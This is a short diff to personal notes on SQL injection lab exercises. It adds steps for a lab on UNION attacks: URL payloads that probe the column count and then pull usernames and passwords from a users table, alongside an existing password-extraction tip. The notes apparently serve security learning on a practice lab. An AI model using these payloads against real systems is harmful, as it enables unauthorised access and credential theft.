@@ -61,5 +61,8 @@ LOGIC USED:- First find number of columns then find which column contains text d
 
 TIP to find password:- ' UNION SELECT username, password FROM users--
 
-#5 Lab: SQL injection UNION attack, retrieving data from other tables
+#5 Lab: SQL injection UNION attack, retrieving interesting data from other tables
 
+    1.url/filter?category=Lifestyle'UNION+SELECT+NULL,NULL--
+    2.url/filter?category=Lifestyle'UNION+SELECT+username,password+FROM+users--
+    3.then solved
